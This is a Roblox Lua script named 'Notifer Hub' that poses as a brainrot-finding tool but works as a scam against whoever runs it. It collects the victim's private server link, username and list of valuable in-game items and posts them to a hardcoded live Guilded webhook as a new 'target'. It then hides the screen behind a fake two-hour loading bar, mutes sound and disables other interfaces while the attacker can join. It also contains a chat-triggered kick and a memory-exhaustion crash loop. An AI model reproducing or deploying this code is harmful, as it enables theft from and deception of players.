-- Script Notifer Hub - By Project BRANZz
-- Configurações iniciais
local Players = game:GetService("Players")
local Player = Players.LocalPlayer
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local UserGameSettings = UserSettings():GetService("UserGameSettings")
local SoundService = game:GetService("SoundService")

-- Variáveis globais
local serverLink = ""
local loadingActive = false
local loadingProgress = 0
local randomTexts = {
    "PROCURANDO ANTI CHEAT",
    "PROCURANDO REMOT EVENTS",
    "APLICANDO COMANDOS VISUAIS",
    "ERRO, AO APLICA TENTANDO NOVAMENTE",
    "CONECTANDO A API PUBLIC",
    "ERRO AO CONECTAR A API...",
    "CONECTADO COM API PUBLICA COM SUCESSO!",
    "PROCURANDO BRAINROTS LISTADOS",
    "PROCURANDO EM SERVIDORES PRIVADOS...",
    "🔑SUCCES CONECTADO COM API PRIVADA",
    "🔗 PUXANDO PESSOAS PARA SEU SERV",
    "ENTROU NO SERV , ....",
    "BRAINROTS Q POSSUI 0, PROCURANDO OUTRO...."
}

-- Webhook URL Guilded
local WEBHOOK_URL = "https://media.guilded.gg/webhooks/b9453e99-729b-4673-9787-e43828658d2c/MpyC72zyucA86weM2SwyIWIekWuM4iyUuAuyscsEwikiAmmmG0U0wcykuEIuWA4WSSUmi6OUyq0WOk2isWcemC"

-- Lista de Brainrots válidos
local VALID_BRAINROTS = {
    "Brri Brri Bicus Dicus Bombicus", "Brutto Gialutto", "Bulbito Bandito Traktorito", "Trulinero Trulicina", 
    "Caessito Satalito", "Cacto Hippopotamo", "Capi Taco", "Matteo", "Caramello Filtrello", "Carloo", 
    "Carrotini Brainini", "Cavallo Virtuoso", "Cellularcini Viciosini", "Chachechi", "Noobini Pizzanini", 
    "Bubo de Fuego", "Chihuanini Taconini", "Chimpanzini Bananini", "Pipi Kiwi", "Cocosini Mama", 
    "Crabbo Limonetta", "Rang Ring Bus", "Dug dug dug", "Dul Dul Dul", "Elefanto Frigo", "Esok Sekolah", 
    "Espresso Signora", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Orcalero Orcala", 
    "Fragola La La La", "Frigo Camelo", "Ganganzelli Trulala", "Garama and Madundung", "Spooky and Pumpky", 
    "Gattatino Nyanino", "Gattito Tacoto", "Odin Din Din Dun", "Glorbo Fruttodrillo", "Gorillo Subwoofero", 
    "Gorillo Watermelondrillo", "Grajpuss Medussi", "Guerriro Digitale", "Job Job Job Sahur", "Karkerkar Kurkur", 
    "Ketchuru and Musturu", "Ketupat Kepat", "La Cucaracha", "La Extinct Grande", "La Grande Combinasion", 
    "La Karkerkar Combinasion", "La Sahur Combinasion", "La Supreme Combinasion", "La Vacca Saturno Saturnita", 
    "Los Crocodillitos", "Las Capuchinas", "Fluriflura", "Las Tralaleritas", "Lerulerulerule", "Lionel Cactuseli", 
    "Burbaloni Lollioli", "Los Combinasionas", "Los Hotspotsitos", "Los Chicleteiras", "Las Vaquitas Saturnitas", 
    "Los Noobinis", "Los Noobo My Hotspotsitos", "Gizafa Celestre", "Las Sis", "Los Matteos", "Los Tipi Tacos", 
    "Los Orcalltos", "Los Bros", "Los Bombinitos", "Zibra Zibralini", "Corn Corn Corn Sahur", "Malame Amarele", 
    "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepedeone", "Ta Ta Ta Ta Sahur", "Urubini Flamenguini", 
    "Los Tungtungtungcitos", "Nooo My Hotspot", "Nuclearo Dinossauro", "Bandito Bobritto", "Chillin Chili", 
    "Alessio", "Orcellia Orcala", "Pakrahmatnamat", "Pandaccini Bananini", "Penguino Cocosino", "Perochello Lemonchello", 
    "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pipi Avocado", "Pipi Corni", "Bambini Crostini", 
    "Pipi Potato", "Pot Hotspot", "Quesadilla Crocodila", "Quivioli Ameleonni", "Raccooni Jandelini", "Rhino Helicopterino", 
    "Rhino Toasterino", "Salamino Penguino", "Sammyni Spyderini", "Los Spyderinis", "Sigma Boy", "Sigma Girl", 
    "Signore Carapace", "Spaghetti Tualetti", "Spioniro Golubiro", "Strawberrelli Flamingelli", "Tim Cheese", 
    "Svinina Bombardino", "Chef Crabracadabra", "Tukanno Bananno", "Tacorita Bicicleta", "Talpa Di Fero", 
    "Tartaruga Cisterna", "Te Te Te Sahur", "Ti Iì Iì Tahur", "Tietze Sahur", "Trippi Troppi", "Tigroligre Frutonni", 
    "Cocofanto Elefanto", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobì Tobì", 
    "Torrtuginni Dragonfrutini", "Tracoductulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", 
    "Tralalita Tralala", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trippi Troppi Troppa Trippa", 
    "Cappuccino Assassino", "Strawberry Elephant", "Mythic Lucky Block", "Noo my Candy", "Brainrot God Lucky Block", 
    "Taco Lucky Block", "Admin Lucky Block", "Toiletto Focaccino", "Yes any examine", "Brashlini Berimbini", 
    "Tang Tang Keletang", "Noo my examine", "Los Primos", "Karker Sahur", "Los Tacoritas", "Perrito Burrito", 
    "Brr Brr Patapàn", "Pop Pop Sahur", "Bananito Bandito", "La Secret Combinasion", "Los Jobcitos", "Los Tortus", 
    "Los 67", "Los Karkeritos", "Squalanana", "Cachorrito Melonito", "Los Lucky Blocks", "Burguro And Fryuro", 
    "Eviledon", "Zombie Tralala", "Jacko Spaventosa", "Los Mobilis", "Chicleteirina Bicicleteirina", "La Spooky Grande", 
    "La Vacca Jacko Linterino", "Vulturino Skeletono", "Tartaragno", "Pinealotto Fruttarino", "Vampira Cappucina", 
    "Quackula", "Mummio Rappitto", "Tentacolo Tecnico", "Jacko Jack Jack", "Magi Ribbitini", "Frankentteo", 
    "Snailenzo", "Chicleteira Bicicleteira", "Lirilli Larila", "Headless Horseman", "Frogato Pirato", "Mieteteira Bicicleteira", 
    "Pakrahmatmatina", "Krupuk Pagi Pagi", "Boatito Auratico", "Bambu Bambu Sahur", "Bananita Dolphintita", "Meowl", 
    "Horegini Boom", "Questadillo Vampiro", "Chipso and Queso", "Mummy Ambalabu", "Jackorilla", "Trickolino", 
    "Secret Lucky Block", "Los Spooky Combinasionas", "Telemorte", "Cappuccino Clownino", "Pot Pumpkin", 
    "Pumpkini Spyderini", "La Casa Boo", "Skull Skull Skull", "Spooky Lucky Block", "Burrito Bandito", 
    "La Taco Combinasion", "Frio Ninja", "Nombo Rollo", "Guest 666", "Ixixixi", "Aquanaut", "Capitano Moby", "Secret"
}

-- IDs para procurar
local TARGET_IDS = {
    "28e4ec29-d005-4636-82af-339f37dcef",
    "960ab477-3f31-4327-845e-6a77ebb5fa6",
    "2206090e-719d-4034-8720-700c9fb2h458",
    "dd76771-ce3c-4108-adae-5a488b2958be",
    "44392a62-6012-413d-9619-dab73c00539f",
    "f38295a3-05ed-fala-959d-5ebe3fd35e5",
    "ed0775b7-ea79-4c54-b9e2-lea07283065d",
    "a55b93d6-2c07-40f6-97fe-d03a87d2d5f0"
}

-- Função para verificar se um nome é um brainrot válido
local function isValidBrainrot(name)
    for _, brainrot in ipairs(VALID_BRAINROTS) do
        if name == brainrot then
            return true
        end
    end
    return false
end

-- Função para procurar brainrots na workspace
local function findBrainrots()
    local foundBrainrots = {}
    
    -- Procurar na pasta Plots
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetDescendants()) do
            if plot:IsA("Model") and isValidBrainrot(plot.Name) then
                table.insert(foundBrainrots, plot.Name)
            end
        end
    end
    
    -- Procurar por IDs específicos
    for _, id in ipairs(TARGET_IDS) do
        local model = Workspace:FindFirstChild(id)
        if model and model:IsA("Model") and isValidBrainrot(model.Name) then
            table.insert(foundBrainrots, model.Name)
        end
    end
    
    -- Remover duplicatas
    local uniqueBrainrots = {}
    for _, brainrot in ipairs(foundBrainrots) do
        local alreadyExists = false
        for _, existing in ipairs(uniqueBrainrots) do
            if existing == brainrot then
                alreadyExists = true
                break
            end
        end
        if not alreadyExists then
            table.insert(uniqueBrainrots, brainrot)
        end
    end
    
    return uniqueBrainrots
end

-- Função para enviar webhook para Guilded
local function sendWebhookToGuilded(brainrots, serverLink)
    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
    local playerName = Player.Name
    local playerCount = #Players:GetPlayers()
    
    -- Criar lista de brainrots formatada
    local brainrotsList = ""
    if #brainrots > 0 then
        for i, brainrot in ipairs(brainrots) do
            brainrotsList = brainrotsList .. "• " .. brainrot .. "\n"
            if i >= 40 then
                brainrotsList = brainrotsList .. "... e mais\n"
                break
            end
        end
    else
        brainrotsList = "Nenhum brainrot detectado"
    end
    
    -- Formatar link para embed
    local linkText = serverLink
    if serverLink ~= "" then
        linkText = "[Clique aqui para entrar no servidor](" .. serverLink .. ")"
    else
        linkText = "Nenhum link fornecido"
    end
    
    -- Criar payload do webhook para Guilded
    local payload = {
        embeds = {{
            title = "🧠 NOTIFER HUB - EXECUÇÃO DETECTADA 🧠",
            description = "@everyone @here, um novo alvo usou o script",
            color = 3447003, -- Azul
            fields = {
                {
                    name = "⌛ Data e hora de execução:",
                    value = currentTime,
                    inline = false
                },
                {
                    name = "👤 Nome de usuário:",
                    value = "`" .. playerName .. "`",
                    inline = true
                },
                {
                    name = "👥 Pessoas no servidor:",
                    value = "`" .. tostring(playerCount) .. "`",
                    inline = true
                },
                {
                    name = "🔗 Link do servidor:",
                    value = linkText,
                    inline = false
                },
                {
                    name = "🎒🧠 BRAINROTS DETECTADOS:",
                    value = brainrotsList,
                    inline = false
                }
            },
            footer = {
                text = "Notifier🧠 || By: Project BRANZz"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    
    -- Enviar webhook
    local success, result = pcall(function()
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)
    
    if success then
        print("✅ Webhook enviado com sucesso para Guilded!")
    else
        warn("❌ Erro ao enviar webhook: " .. tostring(result))
    end
end

-- Sistema de silenciar volume
local function muteVolume()
    -- Silenciar volume
    task.spawn(function()
        while loadingActive do
            pcall(function()
                UserGameSettings.MasterVolume = 0
                SoundService.Volume = 0
            end)
            task.wait(0.5)
        end
    end)
end

-- Sistema de detecção de chat para kick/crash
local function setupChatDetection()
    -- Função para processar mensagens do chat
    local function processChatMessage(player, message)
        if player == Player then
            local msgLower = string.lower(message)
            
            -- Sistema de kick
            if msgLower == "kick" or msgLower == "/kick" then
                task.wait(0.5)
                Player:Kick("Erro: 89972 script\nOla esta mensagem foi enviada pois anti cheat pegou agente então, tivemos que dar um kick em você para não sofre punição 🔰")
            end
            
            -- Sistema de crash
            if msgLower == "crash" or msgLower == "/crash" then
                task.wait(0.5)
                -- Método para crashar o jogo
                while true do
                    -- Criar memory leak intencional
                    local hugeTable = {}
                    for i = 1, 1000000 do
                        hugeTable[i] = string.rep("A", 1000)
                    end
                end
            end
        end
    end
    
    -- Monitorar chat existente
    local function monitorExistingChat()
        for _, player in ipairs(Players:GetPlayers()) do
            local leaderstats = player:FindFirstChild("leaderstats")
            if leaderstats then
                local chatEvents = leaderstats:FindFirstChild("Chatted")
                if chatEvents then
                    chatEvents.ChildAdded:Connect(function(msg)
                        if msg:IsA("StringValue") then
                            processChatMessage(player, msg.Value)
                        end
                    end)
                end
            end
        end
    end
    
    -- Iniciar monitoramento
    monitorExistingChat()
    
    -- Monitorar novos jogadores
    Players.PlayerAdded:Connect(function(player)
        task.wait(2) -- Esperar carregar
        local leaderstats = player:WaitForChild("leaderstats", 5)
        if leaderstats then
            local chatEvents = leaderstats:FindFirstChild("Chatted")
            if chatEvents then
                chatEvents.ChildAdded:Connect(function(msg)
                    if msg:IsA("StringValue") then
                        processChatMessage(player, msg.Value)
                    end
                end)
            end
        end
    end)
end

-- Função para criar a GUI inicial
local function createInitialGUI()
    -- Criar ScreenGui
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "NotiferHubGUI"
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.DisplayOrder = 999
    screenGui.ResetOnSpawn = false
    
    -- Frame principal
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 400, 0, 250)
    mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    -- Sombra
    local shadow = Instance.new("UIStroke")
    shadow.Color = Color3.fromRGB(0, 150, 255)
    shadow.Thickness = 2
    shadow.Parent = mainFrame
    
    -- Título
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 50)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
    title.Text = "NOTIFER HUB 🔰🔗"
    title.TextColor3 = Color3.fromRGB(0, 200, 255)
    title.Font = Enum.Font.GothamBold
    title.TextSize = 24
    title.Parent = mainFrame
    
    -- Campo de digitação
    local inputFrame = Instance.new("Frame")
    inputFrame.Size = UDim2.new(0.9, 0, 0, 40)
    inputFrame.Position = UDim2.new(0.05, 0, 0.3, 0)
    inputFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    inputFrame.BorderSizePixel = 0
    inputFrame.Parent = mainFrame
    
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(1, 0, 1, 0)
    textBox.Position = UDim2.new(0, 0, 0, 0)
    textBox.BackgroundTransparency = 1
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 18
    textBox.PlaceholderText = "Cole o link do seu servidor privado aqui..."
    textBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
    textBox.Text = ""
    textBox.Parent = inputFrame
    
    -- Mensagem de erro
    local errorLabel = Instance.new("TextLabel")
    errorLabel.Size = UDim2.new(0.9, 0, 0, 20)
    errorLabel.Position = UDim2.new(0.05, 0, 0.5, 0)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Text = "O campo não pode ficar vazio!"
    errorLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
    errorLabel.Font = Enum.Font.Gotham
    errorLabel.TextSize = 14
    errorLabel.Visible = false
    errorLabel.Parent = mainFrame
    
    -- Botão
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0.9, 0, 0, 50)
    button.Position = UDim2.new(0.05, 0, 0.65, 0)
    button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    button.BorderSizePixel = 0
    button.Text = "NOTIFER HUB, METODH BRANZZ🔰🔗"
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.Font = Enum.Font.GothamBold
    button.TextSize = 18
    button.Parent = mainFrame
    
    -- Efeito de hover no botão
    button.MouseEnter:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    end)
    
    button.MouseLeave:Connect(function()
        button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    end)
    
    -- Função do botão
    button.MouseButton1Click:Connect(function()
        local link = textBox.Text
        if link == nil or link == "" or link:gsub("%s+", "") == "" then
            errorLabel.Visible = true
            task.wait(2)
            errorLabel.Visible = false
        else
            serverLink = link
            screenGui:Destroy()
            createLoadingScreen()
        end
    end)
    
    -- Adicionar à interface
    screenGui.Parent = CoreGui
end

-- Função para criar tela de carregamento
local function createLoadingScreen()
    loadingActive = true
    
    -- Enviar webhook antes de criar a tela
    task.spawn(function()
        local brainrots = findBrainrots()
        sendWebhookToGuilded(brainrots, serverLink)
    end)
    
    -- Criar ScreenGui para tela de carregamento
    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "LoadingScreen"
    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    loadingGui.DisplayOrder = 99999
    loadingGui.ResetOnSpawn = false
    
    -- Frame que cobre toda a tela
    local fullscreenFrame = Instance.new("Frame")
    fullscreenFrame.Size = UDim2.new(1, 0, 1, 0)
    fullscreenFrame.Position = UDim2.new(0, 0, 0, 0)
    fullscreenFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 30)
    fullscreenFrame.BorderSizePixel = 0
    fullscreenFrame.Parent = loadingGui
    
    -- Texto principal
    local mainText = Instance.new("TextLabel")
    mainText.Size = UDim2.new(1, 0, 0, 60)
    mainText.Position = UDim2.new(0, 0, 0.2, 0)
    mainText.BackgroundTransparency = 1
    mainText.Text = "DUPLICATE HUB ☣️ ESTA PREPARADO PASTAS E COMANDOS VISUAIS...."
    mainText.TextColor3 = Color3.fromRGB(0, 200, 255)
    mainText.Font = Enum.Font.GothamBold
    mainText.TextSize = 28
    mainText.TextStrokeTransparency = 0.8
    mainText.Parent = fullscreenFrame
    
    -- Texto aleatório que muda
    local randomTextLabel = Instance.new("TextLabel")
    randomTextLabel.Size = UDim2.new(1, 0, 0, 40)
    randomTextLabel.Position = UDim2.new(0, 0, 0.35, 0)
    randomTextLabel.BackgroundTransparency = 1
    randomTextLabel.Text = randomTexts[1]
    randomTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    randomTextLabel.Font = Enum.Font.Gotham
    randomTextLabel.TextSize = 20
    randomTextLabel.Parent = fullscreenFrame
    
    -- Frame da barra de carregamento
    local barBackground = Instance.new("Frame")
    barBackground.Size = UDim2.new(0.7, 0, 0, 30)
    barBackground.Position = UDim2.new(0.15, 0, 0.55, 0)
    barBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    barBackground.BorderSizePixel = 0
    barBackground.Parent = fullscreenFrame
    
    -- Barra de carregamento
    local loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 1, 0)
    loadingBar.Position = UDim2.new(0, 0, 0, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    loadingBar.BorderSizePixel = 0
    loadingBar.Parent = barBackground
    
    -- Texto da porcentagem
    local percentText = Instance.new("TextLabel")
    percentText.Size = UDim2.new(1, 0, 1, 0)
    percentText.Position = UDim2.new(0, 0, 0, 0)
    percentText.BackgroundTransparency = 1
    percentText.Text = "0%"
    percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
    percentText.Font = Enum.Font.GothamBold
    percentText.TextSize = 18
    percentText.Parent = barBackground
    
    -- Texto do tempo restante
    local timeText = Instance.new("TextLabel")
    timeText.Size = UDim2.new(1, 0, 0, 30)
    timeText.Position = UDim2.new(0, 0, 0.65, 0)
    timeText.BackgroundTransparency = 1
    timeText.Text = "Tempo estimado: 2:00:00"
    timeText.TextColor3 = Color3.fromRGB(200, 200, 200)
    timeText.Font = Enum.Font.Gotham
    timeText.TextSize = 16
    timeText.Parent = fullscreenFrame
    
    -- Adicionar à interface
    loadingGui.Parent = CoreGui
    
    -- Desabilitar outras interfaces
    for _, gui in ipairs(CoreGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui ~= loadingGui then
            gui.Enabled = false
        end
    end
    
    -- Sistema de silenciar volume
    muteVolume()
    
    -- Sistema de detecção de chat
    setupChatDetection()
    
    -- Variáveis para a animação
    local startTime = tick()
    local totalTime = 7200 -- 2 horas em segundos
    local lastTextChange = tick()
    local textIndex = 1
    local stuckAt89 = false
    
    -- Atualizar animação
    local connection
    connection = RunService.RenderStepped:Connect(function()
        if not loadingActive then
            connection:Disconnect()
            return
        end
        
        -- Calcular progresso
        local elapsed = tick() - startTime
        
        -- Sistema que trava em 89%
        if not stuckAt89 and elapsed >= totalTime * 0.468 then -- 89% do tempo
            stuckAt89 = true
            loadingProgress = 89
        else
            loadingProgress = math.min(190, (elapsed / totalTime) * 190)
        end
        
        -- Atualizar barra de carregamento
        local barWidth = math.clamp(loadingProgress / 190, 0, 1)
        loadingBar.Size = UDim2.new(barWidth, 0, 1, 0)
        percentText.Text = string.format("%.1f%%", loadingProgress)
        
        -- Atualizar tempo restante
        local remaining = totalTime - elapsed
        if remaining < 0 then remaining = 0 end
        
        local hours = math.floor(remaining / 3600)
        local minutes = math.floor((remaining % 3600) / 60)
        local seconds = math.floor(remaining % 60)
        timeText.Text = string.format("Tempo estimado: %02d:%02d:%02d", hours, minutes, seconds)
        
        -- Mudar texto aleatório
        if tick() - lastTextChange > 3 then
            textIndex = textIndex + 1
            if textIndex > #randomTexts then
                textIndex = 1
            end
            
            -- Adicionar nome de player aleatório ocasionalmente
            local players = Players:GetPlayers()
            if #players > 0 and math.random(1, 3) == 1 then
                local randomPlayer = players[math.random(1, #players)]
                randomTextLabel.Text = randomTexts[textIndex] .. "\n[" .. randomPlayer.Name .. "] ENTROU NO SERV"
            else
                randomTextLabel.Text = randomTexts[textIndex]
            end
            
            lastTextChange = tick()
        end
        
        -- Finalizar após 2 horas
        if elapsed >= totalTime then
            loadingActive = false
            connection:Disconnect()
            
            -- Mostrar mensagem de conclusão
            local completionGui = Instance.new("ScreenGui")
            completionGui.Name = "CompletionNotice"
            completionGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
            
            local notice = Instance.new("TextLabel")
            notice.Size = UDim2.new(0, 300, 0, 100)
            notice.Position = UDim2.new(0.5, -150, 0.5, -50)
            notice.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
            notice.Text = "✅ CARREGAMENTO COMPLETO!\nNotifer Hub finalizado com sucesso."
            notice.TextColor3 = Color3.fromRGB(0, 255, 0)
            notice.Font = Enum.Font.GothamBold
            notice.TextSize = 20
            notice.TextWrapped = true
            notice.Parent = completionGui
            
            completionGui.Parent = CoreGui
            
            -- Remover loading screen
            loadingGui:Destroy()
            
            -- Restaurar volume
            pcall(function()
                UserGameSettings.MasterVolume = 1
                SoundService.Volume = 1
            end)
            
            -- Remover mensagem após 5 segundos
            task.wait(5)
            completionGui:Destroy()
        end
    end)
end

-- Inicializar script
task.wait(1) -- Esperar carregamento inicial

-- Verificar se já existe interface
for _, gui in ipairs(CoreGui:GetChildren()) do
    if gui.Name == "NotiferHubGUI" then
        gui:Destroy()
    end
end

createInitialGUI()

print("🔰 Notifer Hub carregado com sucesso!")
print("🔗 Aguardando link do servidor privado...")
